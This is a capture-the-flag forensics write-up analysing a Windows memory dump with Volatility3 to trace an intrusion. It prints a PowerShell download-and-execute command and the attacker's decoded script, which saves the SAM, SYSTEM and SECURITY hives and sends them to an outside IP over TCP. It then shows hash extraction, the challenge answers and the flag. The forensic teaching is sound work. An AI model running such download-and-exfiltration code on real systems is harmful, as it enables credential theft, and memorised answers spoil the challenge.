
# Challenge Name: Memory Loss
## Category: Digital Forensics

## Description

Things have been hapening to my pc, but I keep forgetting to check it due to my bad memory.

`$ nc tcp.espark.tn 7022`

[File Link](https://drive.google.com/file/d/1_0LsZVeMvHDODK4vmIeI1j-jgLMqgjdH/view?usp=sharing)
  
---
## Approach

For this challenge, you were provided with a memory dump and an nc connection for questions, that means it's time to fire up volatility3 and start the analysis :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  nc tcp.espark.tn 7022

Answer all the questions and you'll get the flag. Good Luck !! :3
```

## Solution 

### Question 1 : We'll start with a little sanity check, what's the sha256 hash of the memory dump ?

You can use the command **sha256sum** on the memory dump :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  sha256sum mem.raw 
50fbd4977fac5c503be79744c8256d4147440747462fbed2afdd760208d6cd74  mem.raw
```

#### Answer :

```
We'll start with a little sanity check, what's the sha256 hash of the memory dump ?
> 50fbd4977fac5c503be79744c8256d4147440747462fbed2afdd760208d6cd74
[+] Correct!
```

### Question 2 : What's was the system time when the memory dump was created ? (yyyy-mm-dd hh:mm:ss)

The answer to this question can be found using the **info** plugin in volatility :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.info
Volatility 3 Framework 2.25.0
Progress:  100.00		PDB scanning finished                        
Variable	Value

Kernel Base	0xf80249012000
DTB	0x1ad000
Symbols	file:///home/kakarot/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/D9424FC4861E47C10FAD1B35DEC6DCC8-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdVersionBlock	0xf80249c21400
Major/Minor	15.19041
MachineType	34404
KeNumberProcessors	1
SystemTime	2025-03-29 03:15:05+00:00
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Mon Dec  9 11:07:51 2019
```

#### Answer :

```
What's was the system time when the memory dump was created ? (yyyy-mm-dd hh:mm:ss)
> 2025-03-29 03:15:05
[+] Correct!
```

### Question 3 : The process 'cmd.exe' spawned another process, what's the PID of that process ?

For this question, you can use either the **pstree** or **pslist** plugin :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.pstree
...<SNIP>...
*** 2464	4140	cmd.exe	0xd88633739340	1	-	1	False	2025-03-29 01:26:31.000000 UTC	N/A	\Device\HarddiskVolume3\Windows\System32\cmd.exe	"C:\Windows\system32\cmd.exe" 	C:\Windows\system32\cmd.exe
**** 4224	2464	conhost.exe	0xd88633257080	4	-	1	False	2025-03-29 01:26:31.000000 UTC	N/A	\Device\HarddiskVolume3\Windows\System32\conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4	C:\Windows\system32\conhost.exe
...<SNIP>...
```

#### Answer :

```
The process 'cmd.exe' spawned another process, what's the PID of that process ?
> 4224
[+] Correct!
```

### Question 4 : Looks like a command was ran connecting to some HTTP server, what was the IP and PORT of that server ? 

For this question, the first thing you might think of is using the **netstat** or **netscan** plugin, which is the logical approach but it won't help here. The question mentionned a 'command was ran', which means that we can find the HTTP server the attacker connected to through the commands logs, which we can get with **cmdscan** plugin :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.cmdscan
Volatility 3 Framework 2.25.0
Progress:  100.00		PDB scanning finished                        
PID	Process	ConsoleInfo	Property	Address	Data

....<SNIP>....	
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_0	0x2742ce4b7a0	cd ..
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_1	0x2742ce4b7c0	cd Users
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_2	0x2742ce4b7e0	cd kakarot
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_3	0x2742ce4b800	cd Documents
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_4	0x2742ce4b820	l
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_5	0x2742ce4b840	powershell -c "iwr -Uri 'http://192.168.136.163:6587/K54GHZ.ps1' -OutFile K54GHZ.ps1; .\K54GHZ.ps1"
....<SNIP>....
```

We can see bunch of commands, and the command **iwr** used to interact with the HTTP server with the IP and PORT.

#### Answer :

```
Looks like a command was ran connecting to some HTTP server, what was the IP and PORT of that server ?
> 192.168.136.163:6587
[+] Correct!
```

### Question 5 : What was the name of the file downloaded ?

The answer can be found in the command as well :

```
** 4224	conhost.exe	0x2742ed3d660	_COMMAND_HISTORY.CommandBucket_Command_5	0x2742ce4b840	powershell -c "iwr -Uri 'http://192.168.136.163:6587/K54GHZ.ps1' -OutFile K54GHZ.ps1; .\K54GHZ.ps1"
```

#### Answer : 

```
What was the name of the file downloaded ?
> K54GHZ.ps1
[+] Correct!
```

### Question 6 : A command was used in the script to get some files, what was that command ? (First 2 words)

To answer this question, you need to first download that script and see it's content, for that you need to use the **filescan** plugin to list all the files and then the **dumpfiles** plugin to get the file we need:

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.filescan > filescan.txt     
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  cat filescan.txt | grep 'K54GHZ.ps1'
0xd88635174090	\Users\kakarot\Documents\K54GHZ.ps1 
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.dumpfiles --virtaddr 0xd88635174090
Volatility 3 Framework 2.25.0
Progress:  100.00		PDB scanning finished                        
Cache	FileObject	FileName	Result

DataSectionObject	0xd88635174090	K54GHZ.ps1	file.0xd88635174090.0xd886327f4d60.DataSectionObject.K54GHZ.ps1.dat
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  mv file.0xd88635174090.0xd886327f4d60.DataSectionObject.K54GHZ.ps1.dat K54GHZ.ps1
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  cat K54GHZ.ps1                      
$A=[Convert]::FromBase64String("SEtMTVxTQU0=")
$B=[Convert]::FromBase64String("QzpcVXNlcnNca2FrYXJvdFxEb2N1bWVudHNcU0FN")
$C=[System.Text.Encoding]::UTF8.GetString($A);$D=[System.Text.Encoding]::UTF8.GetString($B)
reg save $C $D /y

$E=[Convert]::FromBase64String("SEtMTVxTWVNURU0=")
$F=[Convert]::FromBase64String("QzpcVXNlcnNca2FrYXJvdFxEb2N1bWVudHNcU1lTVEVN")
$G=[System.Text.Encoding]::UTF8.GetString($E);$H=[System.Text.Encoding]::UTF8.GetString($F)
reg save $G $H /y

$I=[Convert]::FromBase64String("SEtMTVxTRUNVUklUWQ==")
$J=[Convert]::FromBase64String("QzpcVXNlcnNca2FrYXJvdFxEb2N1bWVudHNcU0VDVVJJVFk=")
$K=[System.Text.Encoding]::UTF8.GetString($I);$L=[System.Text.Encoding]::UTF8.GetString($J)
reg save $K $L /y

$M=[Convert]::FromBase64String("SEtMTVxTT0ZUV0FSRQ==")
$N=[Convert]::FromBase64String("QzpcVXNlcnNca2FrYXJvdFxEb2N1bWVudHNcU09GVFdBUkU=")
$O=[System.Text.Encoding]::UTF8.GetString($M);$P=[System.Text.Encoding]::UTF8.GetString($N)
reg save $O $P /y

$Q=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcVXNlcnNca2FrYXJvdFxEb2N1bWVudHNcKg=="))
$R=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcVXNlcnNca2FrYXJvdFxEb2N1bWVudHNcYXo0NTZkLnppcA=="))
Compress-Archive -Path $Q -DestinationPath $R -Force

$S=[System.IO.File]::OpenRead($R)
$T=New-Object System.Net.Sockets.TcpClient
$U="192.168.136.163";$V=4444
$T.Connect($U,$V)
$W=$T.GetStream()
$S.CopyTo($W)
$W.Close()
$T.Close()
$S.Close()
```

As you can see it's a powershell script, let's try to make the script more clear to understand it :

```powershell
$A= "HKLM\SAM"
$B= "C:\Users\kakarot\Documents\SAM"
reg save $A $B /y

$E= "HKLM\SYSTEM"
$F= "C:\Users\kakarot\Documents\SYSTEM"
reg save $E $F /y

$I= "HKLM\SECURITY"
$J= "C:\Users\kakarot\Documents\SECURITY"
reg save $I $J /y

$M= "HKLM\SOFTWARE"
$N= "C:\Users\kakarot\Documents\SOFTWARE"
reg save $M $N /y

$Q= "C:\Users\kakarot\Documents\*"
$R= "C:\Users\kakarot\Documents\az456d.zip"
Compress-Archive -Path $Q -DestinationPath $R -Force

$S=[System.IO.File]::OpenRead($R)
$T=New-Object System.Net.Sockets.TcpClient
$U="192.168.136.163";$V=4444
$T.Connect($U,$V)
$W=$T.GetStream()
$S.CopyTo($W)
$W.Close()
$T.Close()
$S.Close()
```

As you can see, this powershell script is saving the registry hives, saving them in a zip file and sending them to the attacker's IP address. The command used here to save those hives is 'reg save'. 

#### Answer : 

```
A command was used in the script to get some files, what was that command ? (First 2 words)
> reg save
[+] Correct!
```

### Question 7 : A user must have a specific right to execute that command, what is it ?

The memory dump won't be needed here, just a simple google search will give you your answer.

#### Answer : 

```
A user must have a specific right to execute that command, what is it ?
> SeBackupPrivilege
[+] Correct!
```

### Question 8 : The script was saving the files in a zip file, what was the name of that zip ?

Going back to the script you got, you can see the name of the zip file were the registry hives were saved :

```powershell
$R= "C:\Users\kakarot\Documents\az456d.zip"
```

#### Answer :

```
The script was saving the files in a zip file, what was the name of that zip ?
> az456d.zip
[+] Correct!
```

### Question 9 : How many files where saved in the zip ? (except the script)

For this question you'll need to dump the zip file first, after that using the command **7z l az456d.zip** will list you all the files inside the zip (you might need to change the zip permissions first) :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  cat filescan.txt | grep 'az456d.zip'                                                           
0xd886351780a0	\Users\kakarot\Documents\az456d.zip
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.dumpfiles --virtaddr 0xd886351780a0
Volatility 3 Framework 2.25.0
Progress:  100.00		PDB scanning finished                        
Cache	FileObject	FileName	Result

DataSectionObject	0xd886351780a0	az456d.zip	file.0xd886351780a0.0xd886330b9e70.DataSectionObject.az456d.zip.dat
SharedCacheMap	0xd886351780a0	az456d.zip	file.0xd886351780a0.0xd88633763da0.SharedCacheMap.az456d.zip.vacb
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  mv file.0xd886351780a0.0xd886330b9e70.DataSectionObject.az456d.zip.dat az456d.zip
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  7z l az456d.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 16809984 bytes (17 MiB)

Listing archive: az456d.zip

--
Path = az456d.zip
Type = zip
WARNINGS:
There are data after the end of archive
Physical Size = 16809622
Tail Size = 362

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-03-28 20:14:52 .....         1457          469  K54GHZ.ps1
2025-03-28 20:14:54 .....        49152        11933  SAM
2025-03-28 20:14:54 .....        24576         5093  SECURITY
2025-03-28 20:14:56 .....     69693440     14750782  SOFTWARE
2025-03-28 20:14:54 .....     11710464      2040873  SYSTEM
------------------- ----- ------------ ------------  ------------------------
2025-03-28 20:14:56           81479089     16809150  5 files

Warnings: 1
```

#### Answer : 

```
How many files where saved in the zip ? (except the script)
> 4
[+] Correct!
```

### Question 10 : It looks like the attacker wanted those files to get the users hashes, can you get the Administrator's NT hash ?

This question can be answered in two ways : 
##### First way : 

You can unzip the file and use the script **Secretsdump.py** from **Impacket** to dump the hashes : 

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  unzip az456d.zip   
Archive:  az456d.zip
replace K54GHZ.ps1? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: K54GHZ.ps1              
  inflating: SAM                     
  inflating: SECURITY                
  inflating: SOFTWARE                
  inflating: SYSTEM                  
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xa74c725112f8a31f1de20f3a4f5f21f4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4683d8b8fbd562b5c7abb1bfc28b2467:::
kakarot:1001:aad3b435b51404eeaad3b435b51404ee:e4ed1ffc97d7232bb8f14a600d14a4d0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xba3bd06e2d89b440d28e57415609dbc80e7466b8
dpapi_userkey:0xd96adbec8e72a2f2376fff324b842bca507746db
[*] Cleaning up...
```

##### Second way :

Volatility3 has a plugin that can do this job, which is **hashdump** :

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  python3 /home/kakarot/volatility3/vol.py -f mem.raw windows.hashdump                           
Volatility 3 Framework 2.25.0
Progress:  100.00		PDB scanning finished                        
User	rid	lmhash	nthash

Administrator	500	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	4683d8b8fbd562b5c7abb1bfc28b2467
kakarot	1001	aad3b435b51404eeaad3b435b51404ee	e4ed1ffc97d7232bb8f14a600d14a4d0
```

#### Answer :

```
It looks like the attacker wanted those files to get the users hashes, can you get the Administrator's NT hash ?
> 31d6cfe0d16ae931b73c59d7e0c089c0
[+] Correct!
```

And there you have it ! all the questions have been answered correctly and the flag is revealed : 

```
➜  /home/kakarot/RamadhanCTF/foren/memory_loss  nc tcp.espark.tn 7022

Answer all the questions and you'll get the flag. Good Luck !! :3

We'll start with a little sanity check, what's the sha256 hash of the memory dump ?
> 50fbd4977fac5c503be79744c8256d4147440747462fbed2afdd760208d6cd74
[+] Correct!

What's was the system time when the memory dump was created ? (yyyy-mm-dd hh:mm:ss)
> 2025-03-29 03:15:05
[+] Correct!

The process 'cmd.exe' spawned another process, what's the PID of that process ?
> 4224
[+] Correct!

Looks like a command was ran connecting to some HTTP server, what was the IP and PORT of that server ?
> 192.168.136.163:6587
[+] Correct!

What was the name of the file downloaded ?
> K54GHZ.ps1
[+] Correct!

A command was used in the script to get some files, what was that command ? (First 2 words)
> reg save
[+] Correct!

A user must have a specific right to execute that command, what is it ?
> SeBackupPrivilege
[+] Correct!

The script was saving the files in a zip file, what was the name of that zip ?
> az456d.zip
[+] Correct!

How many files where saved in the zip ? (except the script)
> 4
[+] Correct!

It looks like the attacker wanted those files to get the users hashes, can you get the Administrator's NT hash ?
> 31d6cfe0d16ae931b73c59d7e0c089c0
[+] Correct!

[+] Here is the flag: Spark{7ff445b4f57b4280693ebd0684d46044}
```


**Flag** : **Spark{7ff445b4f57b4280693ebd0684d46044}**
